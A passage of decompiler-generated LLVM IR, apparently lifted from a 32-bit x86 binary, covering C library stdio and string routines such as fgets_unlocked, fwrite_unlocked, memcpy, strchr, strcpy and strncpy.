dec_label_pc_804f513:                             ; preds = %dec_label_pc_804f4f9, %dec_label_pc_804f499, %dec_label_pc_804f502
  %v0_804f513 = load i32, i32* @esi, align 4
  %v1_804f513 = add i32 %v0_804f513, 32
  %v2_804f513 = inttoptr i32 %v1_804f513 to i32*
  %v3_804f513 = load i32, i32* %v2_804f513, align 4
  store i32 %v3_804f513, i32* @esi, align 4
  %v1_804f516 = icmp eq i32 %v3_804f513, 0
  %v1_804f518 = icmp eq i1 %v1_804f516, false
  br i1 %v1_804f518, label %dec_label_pc_804f499, label %dec_label_pc_804f51e

dec_label_pc_804f51e:                             ; preds = %dec_label_pc_804f513, %dec_label_pc_804f42d
  %v0_804f51e = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_804f54f

dec_label_pc_804f525:                             ; preds = %dec_label_pc_804f421
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_804f527 = load i8, i8* %tmp23, align 1
  %v4_804f527 = and i8 %v3_804f527, 64
  %v5_804f527 = icmp eq i8 %v4_804f527, 0
  br i1 %v5_804f527, label %dec_label_pc_804f54f, label %dec_label_pc_804f52c

dec_label_pc_804f52c:                             ; preds = %dec_label_pc_804f525
  store i32 -1, i32* @edi, align 4
  %v1_804f533 = call i32 @__stdio_wcommit(i32 %v4_804f415)
  %v1_804f53b = icmp eq i32 %v1_804f533, 0
  %v1_804f53d = icmp eq i1 %v1_804f53b, false
  br i1 %v1_804f53d, label %dec_label_pc_804f54f, label %dec_label_pc_804f53f

dec_label_pc_804f53f:                             ; preds = %dec_label_pc_804f52c
  %v2_804f53f = add i32 %v4_804f415, 8
  %v3_804f53f = inttoptr i32 %v2_804f53f to i32*
  %v4_804f53f = load i32, i32* %v3_804f53f, align 4
  store i32 0, i32* @edi, align 4
  %v3_804f544 = add i32 %v4_804f415, 28
  %v4_804f544 = inttoptr i32 %v3_804f544 to i32*
  store i32 %v4_804f53f, i32* %v4_804f544, align 4
  %tmp24 = bitcast i16* %arg1 to i32*
  %v3_804f547 = load i32, i32* %tmp24, align 4
  %v3_804f547.tr = trunc i32 %v3_804f547 to i16
  %v1_804f54c = and i16 %v3_804f547.tr, -65
  store i16 %v1_804f54c, i16* %arg1, align 2
  br label %dec_label_pc_804f54f

dec_label_pc_804f54f:                             ; preds = %dec_label_pc_804f52c, %dec_label_pc_804f525, %dec_label_pc_804f51e, %dec_label_pc_804f53f
  %v0_804f552 = load i32, i32* @edi, align 4
  store i32 %v0_804f411, i32* @ebx, align 4
  store i32 %v0_804f410, i32* @esi, align 4
  store i32 %v0_804f40f, i32* @edi, align 4
  store i32 %v0_804f40c, i32* @ebp, align 4
  ret i32 %v0_804f552

; uselistorder directives
  uselistorder i32 %v3_804f513, { 1, 2, 0 }
  uselistorder i32 %v2_804f43a, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* bitcast (i32** @global_var_8058238.153 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_805c4e4.149, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_8058254.148 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 3, 1, 4, 2, 0, 5 }
  uselistorder label %dec_label_pc_804f54f, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804f513, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f4f9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f4c6, { 1, 0 }
  uselistorder label %dec_label_pc_804f499, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_804f55c = load i32, i32* @ebp, align 4
  %v4_804f567 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f567, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_804f567, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_804f5ad.preheader, label %dec_label_pc_804f5b9

dec_label_pc_804f5ad.preheader:                   ; preds = %entry
  %v1_804f5ad19 = add i32 %arg2, -1
  %v8_804f5ad23 = icmp eq i32 %v1_804f5ad19, 0
  store i32 %v1_804f5ad19, i32* @esi, align 4
  %v1_804f5ae25 = icmp eq i1 %v8_804f5ad23, false
  br i1 %v1_804f5ae25, label %dec_label_pc_804f577, label %dec_label_pc_804f5b0

dec_label_pc_804f577:                             ; preds = %dec_label_pc_804f5ad.preheader, %dec_label_pc_804f5ab.dec_label_pc_804f5ad_crit_edge.dec_label_pc_804f577_crit_edge
  %v0_804f577 = phi i32 [ %v0_804f577.pre, %dec_label_pc_804f5ab.dec_label_pc_804f5ad_crit_edge.dec_label_pc_804f577_crit_edge ], [ %arg3, %dec_label_pc_804f5ad.preheader ]
  %v1_804f577 = add i32 %v0_804f577, 16
  %v2_804f577 = inttoptr i32 %v1_804f577 to i32*
  %v3_804f577 = load i32, i32* %v2_804f577, align 4
  store i32 %v3_804f577, i32* %eax.global-to-local, align 4
  %v2_804f57a = add i32 %v0_804f577, 24
  %v3_804f57a = inttoptr i32 %v2_804f57a to i32*
  %v4_804f57a = load i32, i32* %v3_804f57a, align 4
  %v10_804f57a = icmp ult i32 %v3_804f577, %v4_804f57a
  %v1_804f57d = icmp eq i1 %v10_804f57a, false
  br i1 %v1_804f57d, label %dec_label_pc_804f58d, label %dec_label_pc_804f57f

dec_label_pc_804f57f:                             ; preds = %dec_label_pc_804f577
  %v1_804f57f = inttoptr i32 %v3_804f577 to i8*
  %v2_804f57f = load i8, i8* %v1_804f57f, align 1
  %v3_804f57f = zext i8 %v2_804f57f to i32
  %v4_804f57f = load i32, i32* @edx, align 4
  %v5_804f57f = and i32 %v4_804f57f, -256
  %v6_804f57f = or i32 %v5_804f57f, %v3_804f57f
  store i32 %v6_804f57f, i32* @edx, align 4
  %v1_804f581 = add i32 %v3_804f577, 1
  store i32 %v1_804f581, i32* %eax.global-to-local, align 4
  %v2_804f582 = load i32, i32* @ebx, align 4
  %v3_804f582 = inttoptr i32 %v2_804f582 to i8*
  store i8 %v2_804f57f, i8* %v3_804f582, align 1
  %v0_804f584 = load i32, i32* @ebx, align 4
  %v1_804f584 = add i32 %v0_804f584, 1
  store i32 %v1_804f584, i32* @ebx, align 4
  %v0_804f585 = load i32, i32* @edx, align 4
  %v1_804f585 = trunc i32 %v0_804f585 to i8
  %v10_804f585 = icmp eq i8 %v1_804f585, 10
  %v0_804f588 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f588 = load i32, i32* @ebp, align 4
  %v2_804f588 = add i32 %v1_804f588, 16
  %v3_804f588 = inttoptr i32 %v2_804f588 to i32*
  store i32 %v0_804f588, i32* %v3_804f588, align 4
  br i1 %v10_804f585, label %dec_label_pc_804f5b0, label %dec_label_pc_804f5ab.dec_label_pc_804f5ad_crit_edge

dec_label_pc_804f58d:                             ; preds = %dec_label_pc_804f577
  %v0_804f591 = call i32 @getc_unlocked()
  %v1_804f591 = trunc i32 %v0_804f591 to i8
  store i32 %v0_804f591, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_804f591, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_804f59c = icmp eq i1 %tmp, false
  br i1 %v1_804f59c, label %dec_label_pc_804f5ab, label %dec_label_pc_804f59e

dec_label_pc_804f59e:                             ; preds = %dec_label_pc_804f58d
  %v0_804f59e = load i32, i32* @ebp, align 4
  %v1_804f59e = inttoptr i32 %v0_804f59e to i8*
  %v2_804f59e = load i8, i8* %v1_804f59e, align 1
  %v3_804f59e = and i8 %v2_804f59e, 8
  %v4_804f59e = icmp eq i8 %v3_804f59e, 0
  br i1 %v4_804f59e, label %dec_label_pc_804f5b0, label %dec_label_pc_804f5b9

dec_label_pc_804f5ab:                             ; preds = %dec_label_pc_804f58d
  %v3_804f5a6 = load i32, i32* @ebx, align 4
  %v4_804f5a6 = inttoptr i32 %v3_804f5a6 to i8*
  store i8 %v1_804f591, i8* %v4_804f5a6, align 1
  %v0_804f5a8 = load i32, i32* @ebx, align 4
  %v1_804f5a8 = add i32 %v0_804f5a8, 1
  store i32 %v1_804f5a8, i32* @ebx, align 4
  %v11_804f5a9 = icmp eq i8 %v1_804f591, 10
  br i1 %v11_804f5a9, label %dec_label_pc_804f5b0, label %dec_label_pc_804f5ab.dec_label_pc_804f5ad_crit_edge

dec_label_pc_804f5ab.dec_label_pc_804f5ad_crit_edge: ; preds = %dec_label_pc_804f57f, %dec_label_pc_804f5ab
  %v0_804f5ad.pre = load i32, i32* @esi, align 4
  %v1_804f5ad = add i32 %v0_804f5ad.pre, -1
  %v8_804f5ad = icmp eq i32 %v1_804f5ad, 0
  store i32 %v1_804f5ad, i32* @esi, align 4
  %v1_804f5ae = icmp eq i1 %v8_804f5ad, false
  br i1 %v1_804f5ae, label %dec_label_pc_804f5ab.dec_label_pc_804f5ad_crit_edge.dec_label_pc_804f577_crit_edge, label %dec_label_pc_804f5b0

dec_label_pc_804f5ab.dec_label_pc_804f5ad_crit_edge.dec_label_pc_804f577_crit_edge: ; preds = %dec_label_pc_804f5ab.dec_label_pc_804f5ad_crit_edge
  %v0_804f577.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f577

dec_label_pc_804f5b0:                             ; preds = %dec_label_pc_804f5ad.preheader, %dec_label_pc_804f57f, %dec_label_pc_804f5ab.dec_label_pc_804f5ad_crit_edge, %dec_label_pc_804f5ab, %dec_label_pc_804f59e
  %v0_804f5b0 = load i32, i32* @ebx, align 4
  %v1_804f5b0 = load i32, i32* @edi, align 4
  %tmp27 = icmp ugt i32 %v0_804f5b0, %v1_804f5b0
  br i1 %tmp27, label %dec_label_pc_804f5b4, label %dec_label_pc_804f5b9

dec_label_pc_804f5b4:                             ; preds = %dec_label_pc_804f5b0
  %v1_804f5b4 = inttoptr i32 %v0_804f5b0 to i8*
  store i8 0, i8* %v1_804f5b4, align 1
  %v0_804f5be.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804f5bb

dec_label_pc_804f5b9:                             ; preds = %dec_label_pc_804f5b0, %dec_label_pc_804f59e, %entry
  br label %dec_label_pc_804f5bb

dec_label_pc_804f5bb:                             ; preds = %dec_label_pc_804f5b4, %dec_label_pc_804f5b9
  %v0_804f5be = phi i32 [ %v0_804f5be.pre, %dec_label_pc_804f5b4 ], [ 0, %dec_label_pc_804f5b9 ]
  store i32 %v0_804f5be, i32* %eax.global-to-local, align 4
  store i32 %v0_804f55c, i32* @ebp, align 4
  ret i32 %v0_804f5be

; uselistorder directives
  uselistorder i32 %v0_804f5be, { 1, 0 }
  uselistorder i32 %v0_804f5b0, { 1, 0 }
  uselistorder i32 %v1_804f5ad, { 1, 0 }
  uselistorder i32 %v0_804f591, { 0, 2, 1 }
  uselistorder i32 %v0_804f577, { 1, 0 }
  uselistorder label %dec_label_pc_804f5bb, { 1, 0 }
  uselistorder label %dec_label_pc_804f5b0, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_804f5ab.dec_label_pc_804f5ad_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804f577, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804f5c8 = load i32, i32* @esi, align 4
  %v0_804f5c9 = load i32, i32* @ebx, align 4
  store i32 %v0_804f5c9, i32* %stack_var_-8, align 4
  %v4_804f5cd = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f5cd, i32* @ebx, align 4
  %v3_804f5d2 = call i32 @strlen(i8* %arg1)
  store i32 %v3_804f5d2, i32* @esi, align 4
  %v0_804f5e3 = load i32, i32* @ebx, align 4
  %v6_804f5e4 = call i32 @__GI_fwrite_unlocked(i32 %v0_804f5e3, i64 1, i32 %v3_804f5d2, i32 %arg2)
  %v1_804f5ee = load i32, i32* @esi, align 4
  %v12_804f5ee = icmp eq i32 %v6_804f5e4, %v1_804f5ee
  %v3_804f5f0 = select i1 %v12_804f5ee, i32 %v6_804f5e4, i32 -1
  %v2_804f5f6 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f5f6, i32* @ebx, align 4
  store i32 %v0_804f5c8, i32* @esi, align 4
  ret i32 %v3_804f5f0

; uselistorder directives
  uselistorder i32 %v6_804f5e4, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804f5fc = load i32, i32* @edi, align 4
  %v0_804f5fd = load i32, i32* @esi, align 4
  %v0_804f5fe = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804f603 = trunc i64 %arg2 to i32
  store i32 %v4_804f603, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804f60b = inttoptr i32 %arg4 to i16*
  %v2_804f60b = load i16, i16* %v1_804f60b, align 2
  %v1_804f60e = and i16 %v2_804f60b, 192
  %v6_804f613 = icmp eq i16 %v1_804f60e, 192
  br i1 %v6_804f613, label %dec_label_pc_804f62e, label %dec_label_pc_804f61a

dec_label_pc_804f61a:                             ; preds = %entry
  %v0_804f61a = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v9_804f622 = call i32 @__stdio_trans2w_o(i16* %v1_804f60b, i32 128, i32 %v0_804f61a, i32 %v0_804f61a, i32 %v0_804f5fe, i32 %v0_804f5fd, i32 %v0_804f5fc)
  %v1_804f62a = icmp eq i32 %v9_804f622, 0
  %v1_804f62c = icmp eq i1 %v1_804f62a, false
  br i1 %v1_804f62c, label %dec_label_pc_804f66e, label %dec_label_pc_804f62e

dec_label_pc_804f62e:                             ; preds = %dec_label_pc_804f61a, %entry
  %v2_804f62e = icmp eq i32 %v4_804f603, 0
  br i1 %v2_804f62e, label %dec_label_pc_804f66e, label %dec_label_pc_804f632

dec_label_pc_804f632:                             ; preds = %dec_label_pc_804f62e
  %v1_804f632 = icmp eq i32 %arg3, 0
  br i1 %v1_804f632, label %dec_label_pc_804f66e, label %dec_label_pc_804f636

dec_label_pc_804f636:                             ; preds = %dec_label_pc_804f632
  %v9_804f63b = udiv i64 4294967295, %arg2
  %v10_804f63b = trunc i64 %v9_804f63b to i32
  %v6_804f63f = icmp ult i32 %v10_804f63b, %arg3
  br i1 %v6_804f63f, label %dec_label_pc_804f65b, label %dec_label_pc_804f641

dec_label_pc_804f641:                             ; preds = %dec_label_pc_804f636
  %sext = mul i64 %arg2, 4294967296
  %v2_804f644 = sdiv i64 %sext, 4294967296
  %v3_804f644 = sext i32 %arg3 to i64
  %v4_804f644 = mul nsw i64 %v3_804f644, %v2_804f644
  %v5_804f644 = trunc i64 %v4_804f644 to i32
  %v0_804f647 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_804f64d = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_804f644, i32 %v0_804f647, i32 %v10_804f63b)
  %v6_804f64d = sext i32 %v5_804f64d to i64
  %v10_804f657 = udiv i64 %v6_804f64d, %arg2
  %v11_804f657 = trunc i64 %v10_804f657 to i32
  br label %dec_label_pc_804f670

dec_label_pc_804f65b:                             ; preds = %dec_label_pc_804f636
  %v0_804f65b = load i32, i32* @ebx, align 4
  %v1_804f65b = inttoptr i32 %v0_804f65b to i32*
  %v2_804f65b = load i32, i32* %v1_804f65b, align 4
  %v1_804f65d = or i32 %v2_804f65b, 8
  %v1_804f660 = trunc i32 %v1_804f65d to i16
  %v3_804f660 = inttoptr i32 %v0_804f65b to i16*
  store i16 %v1_804f660, i16* %v3_804f660, align 2
  %v0_804f663 = load i32, i32* %stack_var_-28, align 4
  %v1_804f663 = call i32 @__errno_location(i32 %v0_804f663)
  %v1_804f668 = inttoptr i32 %v1_804f663 to i32*
  store i32 22, i32* %v1_804f668, align 4
  br label %dec_label_pc_804f66e

dec_label_pc_804f66e:                             ; preds = %dec_label_pc_804f632, %dec_label_pc_804f62e, %dec_label_pc_804f61a, %dec_label_pc_804f65b
  br label %dec_label_pc_804f670

dec_label_pc_804f670:                             ; preds = %dec_label_pc_804f641, %dec_label_pc_804f66e
  %v0_804f673 = phi i32 [ %v11_804f657, %dec_label_pc_804f641 ], [ 0, %dec_label_pc_804f66e ]
  store i32 %v0_804f5fd, i32* @esi, align 4
  store i32 %v0_804f5fc, i32* @edi, align 4
  ret i32 %v0_804f673

; uselistorder directives
  uselistorder i32 %v0_804f61a, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f670, { 1, 0 }
  uselistorder label %dec_label_pc_804f66e, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f675 = load i32, i32* @esi, align 4
  store i32 %v0_804f675, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804f676 = sdiv i32 %sext, 16777216
  store i32 %v4_804f676, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f67e = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f67e, i32* %edi.global-to-local, align 4
  %v2_804f684 = udiv i32 %v4_804f676, 4
  %v3_804f687 = inttoptr i32 %arg2 to i8*
  %v4_804f687 = bitcast i16* %arg1 to i8*
  %v5_804f687 = call i8* @_memcpy(i8* %v4_804f687, i8* %v3_804f687, i32 %v2_804f684)
  %v6_804f687 = ptrtoint i8* %v5_804f687 to i32
  store i32 %v6_804f687, i32* @ecx, align 4
  %v0_804f689 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f689 = and i32 %v0_804f689, 2
  %v3_804f689 = icmp eq i32 %v2_804f689, 0
  br i1 %v3_804f689, label %dec_label_pc_804f68f, label %dec_label_pc_804f68d

dec_label_pc_804f68d:                             ; preds = %entry
  %v0_804f68d = load i32, i32* %esi.global-to-local, align 4
  %v1_804f68d = inttoptr i32 %v0_804f68d to i16*
  %v2_804f68d = load i16, i16* %v1_804f68d, align 2
  %v3_804f68d = load i32, i32* %edi.global-to-local, align 4
  %v4_804f68d = inttoptr i32 %v3_804f68d to i16*
  store i16 %v2_804f68d, i16* %v4_804f68d, align 2
  %v5_804f68d = load i32, i32* %edi.global-to-local, align 4
  %v6_804f68d = load i32, i32* %esi.global-to-local, align 4
  %v7_804f68d = load i1, i1* @df, align 1
  %v8_804f68d = select i1 %v7_804f68d, i32 -2, i32 2
  %v9_804f68d = add i32 %v8_804f68d, %v5_804f68d
  %v10_804f68d = add i32 %v8_804f68d, %v6_804f68d
  store i32 %v9_804f68d, i32* %edi.global-to-local, align 4
  store i32 %v10_804f68d, i32* %esi.global-to-local, align 4
  %v0_804f68f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f68f

dec_label_pc_804f68f:                             ; preds = %entry, %dec_label_pc_804f68d
  %v0_804f68f = phi i32 [ %v0_804f689, %entry ], [ %v0_804f68f.pre, %dec_label_pc_804f68d ]
  %v2_804f68f = urem i32 %v0_804f68f, 2
  %v3_804f68f = icmp eq i32 %v2_804f68f, 0
  br i1 %v3_804f68f, label %dec_label_pc_804f694, label %dec_label_pc_804f693

dec_label_pc_804f693:                             ; preds = %dec_label_pc_804f68f
  %v0_804f693 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f693 = inttoptr i32 %v0_804f693 to i8*
  %v2_804f693 = load i8, i8* %v1_804f693, align 1
  %v3_804f693 = load i32, i32* %edi.global-to-local, align 4
  %v4_804f693 = inttoptr i32 %v3_804f693 to i8*
  store i8 %v2_804f693, i8* %v4_804f693, align 1
  %v5_804f693 = load i32, i32* %edi.global-to-local, align 4
  %v6_804f693 = load i32, i32* %esi.global-to-local, align 4
  %v7_804f693 = load i1, i1* @df, align 1
  %v8_804f693 = select i1 %v7_804f693, i32 -1, i32 1
  %v9_804f693 = add i32 %v8_804f693, %v5_804f693
  %v10_804f693 = add i32 %v8_804f693, %v6_804f693
  store i32 %v9_804f693, i32* %edi.global-to-local, align 4
  store i32 %v10_804f693, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f694

dec_label_pc_804f694:                             ; preds = %dec_label_pc_804f68f, %dec_label_pc_804f693
  store i32 %v4_804f67e, i32* %eax.global-to-local, align 4
  %v2_804f698 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f698, i32* @esi, align 4
  ret i32 %v4_804f67e

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_804f694, { 1, 0 }
  uselistorder label %dec_label_pc_804f68f, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804f69c = load i32, i32* @edi, align 4
  %v4_804f6a5 = ptrtoint i8* %arg1 to i32
  %v5_804f6a9 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_804f6a9 = ptrtoint i8* %v5_804f6a9 to i32
  store i32 %v6_804f6a9, i32* @ecx, align 4
  store i32 %v0_804f69c, i32* @edi, align 4
  ret i32 %v4_804f6a5

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804f6b5 = ptrtoint i8* %arg1 to i32
  %v2_804f6bd = mul i32 %arg2, 256
  %v3_804f6bd = and i32 %v2_804f6bd, 65280
  %v4_804f6bd = and i32 %arg2, -65281
  %v5_804f6bd = or i32 %v3_804f6bd, %v4_804f6bd
  %v8_804f6bf.pre = load i1, i1* @df, align 1
  %v9_804f6bf = select i1 %v8_804f6bf.pre, i32 -1, i32 1
  br label %dec_label_pc_804f6bf

dec_label_pc_804f6bf:                             ; preds = %dec_label_pc_804f6c4, %entry
  %v4_804f6bf = phi i32 [ %v6_804f6bf, %dec_label_pc_804f6c4 ], [ %v5_804f6bd, %entry ]
  %v7_804f6bf = phi i32 [ %v10_804f6bf, %dec_label_pc_804f6c4 ], [ %v4_804f6b5, %entry ]
  %v1_804f6bf = inttoptr i32 %v7_804f6bf to i8*
  %v2_804f6bf = load i8, i8* %v1_804f6bf, align 1
  %v10_804f6bf = add i32 %v7_804f6bf, %v9_804f6bf
  %v3_804f6c0 = udiv i32 %v4_804f6bf, 256
  %v4_804f6c0 = trunc i32 %v3_804f6c0 to i8
  %v16_804f6c0 = icmp eq i8 %v2_804f6bf, %v4_804f6c0
  br i1 %v16_804f6c0, label %dec_label_pc_804f6cd, label %dec_label_pc_804f6c4

dec_label_pc_804f6c4:                             ; preds = %dec_label_pc_804f6bf
  %v3_804f6bf = zext i8 %v2_804f6bf to i32
  %v5_804f6bf = and i32 %v4_804f6bf, -256
  %v6_804f6bf = or i32 %v3_804f6bf, %v5_804f6bf
  %v4_804f6c4 = icmp eq i8 %v2_804f6bf, 0
  %v1_804f6c6 = icmp eq i1 %v4_804f6c4, false
  br i1 %v1_804f6c6, label %dec_label_pc_804f6bf, label %dec_label_pc_804f6c8

dec_label_pc_804f6c8:                             ; preds = %dec_label_pc_804f6c4
  br label %dec_label_pc_804f6cd

dec_label_pc_804f6cd:                             ; preds = %dec_label_pc_804f6bf, %dec_label_pc_804f6c8
  %v0_804f6cd = phi i32 [ 1, %dec_label_pc_804f6c8 ], [ %v10_804f6bf, %dec_label_pc_804f6bf ]
  %v1_804f6cf = add i32 %v0_804f6cd, -1
  ret i32 %v1_804f6cf

; uselistorder directives
  uselistorder i8 %v2_804f6bf, { 1, 2, 0 }
  uselistorder i32 %v4_804f6bf, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f6cd, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f6d5 = load i32, i32* @esi, align 4
  store i32 %v0_804f6d5, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f6dd = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f6dd, i32* %edi.global-to-local, align 4
  %v4_804f6e1.pre = load i32, i32* @eax, align 4
  %v8_804f6e1.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804f6e1

dec_label_pc_804f6e1:                             ; preds = %dec_label_pc_804f6e1.dec_label_pc_804f6e1_crit_edge, %entry
  %v2_804f6e2 = phi i32 [ %v7_804f6e2, %dec_label_pc_804f6e1.dec_label_pc_804f6e1_crit_edge ], [ %v4_804f6dd, %entry ]
  %v8_804f6e1 = phi i1 [ %v5_804f6e2, %dec_label_pc_804f6e1.dec_label_pc_804f6e1_crit_edge ], [ %v8_804f6e1.pre, %entry ]
  %v4_804f6e1 = phi i32 [ %v0_804f6e3, %dec_label_pc_804f6e1.dec_label_pc_804f6e1_crit_edge ], [ %v4_804f6e1.pre, %entry ]
  %v7_804f6e1 = phi i32 [ %v0_804f6e1.pre, %dec_label_pc_804f6e1.dec_label_pc_804f6e1_crit_edge ], [ %arg2, %entry ]
  %v1_804f6e1 = inttoptr i32 %v7_804f6e1 to i8*
  %v2_804f6e1 = load i8, i8* %v1_804f6e1, align 1
  %v3_804f6e1 = zext i8 %v2_804f6e1 to i32
  %v5_804f6e1 = and i32 %v4_804f6e1, -256
  %v6_804f6e1 = or i32 %v3_804f6e1, %v5_804f6e1
  store i32 %v6_804f6e1, i32* %eax.global-to-local, align 4
  %v9_804f6e1 = select i1 %v8_804f6e1, i32 -1, i32 1
  %v10_804f6e1 = add i32 %v7_804f6e1, %v9_804f6e1
  store i32 %v10_804f6e1, i32* %esi.global-to-local, align 4
  %v3_804f6e2 = inttoptr i32 %v2_804f6e2 to i8*
  store i8 %v2_804f6e1, i8* %v3_804f6e2, align 1
  %v4_804f6e2 = load i32, i32* %edi.global-to-local, align 4
  %v5_804f6e2 = load i1, i1* @df, align 1
  %v6_804f6e2 = select i1 %v5_804f6e2, i32 -1, i32 1
  %v7_804f6e2 = add i32 %v6_804f6e2, %v4_804f6e2
  store i32 %v7_804f6e2, i32* %edi.global-to-local, align 4
  %v0_804f6e3 = load i32, i32* %eax.global-to-local, align 4
  %v3_804f6e3 = trunc i32 %v0_804f6e3 to i8
  %v4_804f6e3 = icmp eq i8 %v3_804f6e3, 0
  %v1_804f6e5 = icmp eq i1 %v4_804f6e3, false
  br i1 %v1_804f6e5, label %dec_label_pc_804f6e1.dec_label_pc_804f6e1_crit_edge, label %dec_label_pc_804f6e7

dec_label_pc_804f6e1.dec_label_pc_804f6e1_crit_edge: ; preds = %dec_label_pc_804f6e1
  %v0_804f6e1.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f6e1

dec_label_pc_804f6e7:                             ; preds = %dec_label_pc_804f6e1
  store i32 %v4_804f6dd, i32* %eax.global-to-local, align 4
  %v2_804f6eb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f6eb, i32* @edx, align 4
  %v2_804f6ec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f6ec, i32* @esi, align 4
  ret i32 %v4_804f6dd

; uselistorder directives
  uselistorder i32 %v0_804f6e3, { 1, 0 }
  uselistorder i32 %v7_804f6e2, { 1, 0 }
  uselistorder i1 %v5_804f6e2, { 1, 0 }
  uselistorder i32 %v4_804f6dd, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f705 = load i32, i32* @esi, align 4
  store i32 %v0_804f705, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f711 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f711, i32* %edi.global-to-local, align 4
  %v1_804f715 = add i32 %arg3, 1
  store i32 %v1_804f715, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f716

dec_label_pc_804f716:                             ; preds = %dec_label_pc_804f719, %entry
  %v3_804f71a = phi i32 [ %v4_804f711, %entry ], [ %v8_804f71a, %dec_label_pc_804f719 ]
  %v0_804f716 = phi i32 [ %v1_804f715, %entry ], [ %v0_804f716.pre, %dec_label_pc_804f719 ]
  %v1_804f716 = add i32 %v0_804f716, -1
  %v8_804f716 = icmp eq i32 %v1_804f716, 0
  store i32 %v1_804f716, i32* %ecx.global-to-local, align 4
  br i1 %v8_804f716, label %.loopexit, label %dec_label_pc_804f719

